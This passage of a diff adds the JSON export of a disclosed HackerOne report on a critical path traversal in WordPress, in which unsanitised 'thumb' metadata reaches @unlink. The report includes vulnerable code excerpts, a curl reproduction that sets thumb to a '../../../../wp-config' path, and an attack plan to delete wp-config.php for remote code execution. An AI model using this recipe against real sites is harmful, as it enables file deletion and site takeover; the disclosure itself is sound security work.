+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Btw, I'm on wp slack, so anyone who wants to chat or ask something can find me there. @Slavco there too :) ", 
+            "markdown_message": "<p>Btw, I&#39;m on wp slack, so anyone who wants to chat or ask something can find me there. <a href=\"/slavco\">@Slavco</a> there too :) </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3116746, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-07-30T14:03:15.388Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-07-30T14:03:15.388Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "^^ function `wp_delete_attachment_files` not meta name :)))", 
+            "markdown_message": "<p>^^ function <code>wp_delete_attachment_files</code> not meta name :)))</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 3116770, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-08-29T13:47:05.792Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-08-29T13:47:05.792Z", 
+            "actor": {
+                "url": "/wordpress", 
+                "profile": {
+                    "name": "WordPress"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+                }
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3263992, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "b258ea62bf297b02afa9854", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": true, 
+        "url": "/b258ea62bf297b02afa9854", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 19, 
+        "name": "Path Traversal"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -8584225.687213605, 
+    "disclosed_at": "2018-08-29T13:47:04.950Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/291878", 
+    "created_at": "2017-11-20T13:57:40.409Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Vulnerable place 1: <code>wp-admin/post.php</code><br>\n<code>$newmeta[&#39;thumb&#39;]</code> is placed into DB not sanitized directly from user input.</p>\n<pre class=\"highlight plaintext\"><code>case &#39;editattachment&#39;:\n    check_admin_referer(&#39;update-post_&#39; . $post_id);\n    // Don&#39;t let these be changed\n    unset($_POST[&#39;guid&#39;]);\n    $_POST[&#39;post_type&#39;] = &#39;attachment&#39;;\n    // Update the thumbnail filename\n    $newmeta = wp_get_attachment_metadata( $post_id, true );\n    $newmeta[&#39;thumb&#39;] = $_POST[&#39;thumb&#39;];\n    wp_update_attachment_metadata( $post_id, $newmeta );\n</code></pre>\n<p>Vulnerable place 2: <code>wp_delete_attachment</code> <br>\nThere we have <code>$meta = wp_get_attachment_metadata( $post_id );</code> and below in the code:</p>\n<pre class=\"highlight plaintext\"><code>if ( ! empty($meta[&#39;thumb&#39;]) ) {\n        // Don&#39;t delete the thumb if another attachment uses it.\n        if (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( &quot;SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = &#39;_wp_attachment_metadata&#39; AND meta_value LIKE %s AND post_id &lt;&gt; %d&quot;, &#39;%&#39; . $wpdb-&gt;esc_like( $meta[&#39;thumb&#39;] ) . &#39;%&#39;, $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta[&#39;thumb&#39;], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( &#39;wp_delete_file&#39;, $thumbfile );\n            @ unlink( path_join($uploadpath[&#39;basedir&#39;], $thumbfile) );\n        }\n    }\n</code></pre>\n<p>This means we can craft any value from the <code>wp-admin</code> for <code>thumb</code> property and that value to be sent towards <code>@unlink</code></p>\n\n<p>How to reproduce:</p>\n\n<ol>\n<li>Upload image via media menu e.g. new</li>\n<li>Go to edit post (old fashioned way)</li>\n<li>Grad the <code>id</code>, <code>_wpnonce</code> and choose your payload <code>../../../../wp-config.php</code>\n</li>\n<li>Craft your payload(set auth cookies, ua, referrers, ...): \n<code>\ncurl &#39;http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&amp;action=editattachment&amp;_wpnonce=[yournonce]&#39; -H &#39;place your client headers: ua, cookies in order to mimic the authenticated user &#39; -d &#39;thumb=../../../../wp-config-slavco.php&#39; --compressed \n</code>\n</li>\n<li>Delete the file from the admin</li>\n</ol>\n\n<p>Impact:</p>\n\n<ol>\n<li>Requires user that have permission to manipulate media files / posts</li>\n<li>Hard to be spotted because:\n2.1 Payload is deleted from DB\n2.2 <code>@unlink</code> won&#39;t rise error in case of any failed attempts</li>\n<li>Affects many blogging/publishing, e-commerce, ...  setups.</li>\n</ol>\n\n<p>Attack:</p>\n\n<ol>\n<li>Delete <code>wp-config.php</code> and relaunch wp setup with remote attackers db - RCE </li>\n<li>Delete <code>.htaccess</code> or any another <code>index.html</code>/<code>index.php</code> in order to disclose any stored data under web accessible directory</li>\n</ol>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://wordpress.org/", 
+            "about": "Beautiful sites of any kind.", 
+            "twitter_handle": "wordpress", 
+            "name": "WordPress"
+        }, 
+        "handle": "wordpress", 
+        "url": "https://hackerone.com/wordpress", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/055/2ded484d947025dc191342c9ccdcf00effc53ff6_small.jpg?1392934661", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 55, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
